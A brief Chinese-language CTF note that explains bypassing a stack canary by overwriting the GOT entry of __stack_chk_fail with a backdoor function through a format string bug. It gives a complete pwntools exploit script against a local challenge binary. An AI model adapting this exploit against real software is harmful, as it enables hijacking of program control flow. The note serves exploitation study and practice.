# stack_chk_fail-canary绕过

这个stack_chk_fail是一个函数他是当我们对canary造成破坏时程序就是就会去调用这个函数比如通过格式化字符串漏洞把对应的的函数位置修改为door的位置

这个就是当我们无法使用其他方法绕过canary时也可以使用的方法

```py
from pwn import *

elf = ELF("./pwn")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])

# gdb.attach(p, 'b *0x40124b\nc')
# pause()

payload = fmtstr_payload(6, {elf.got['__stack_chk_fail']: elf.sym['backdoor']})
payload = payload.ljust(0x108, b'a')
payload += b'b'

p.sendafter("please input:", payload)

p.interactive()

```

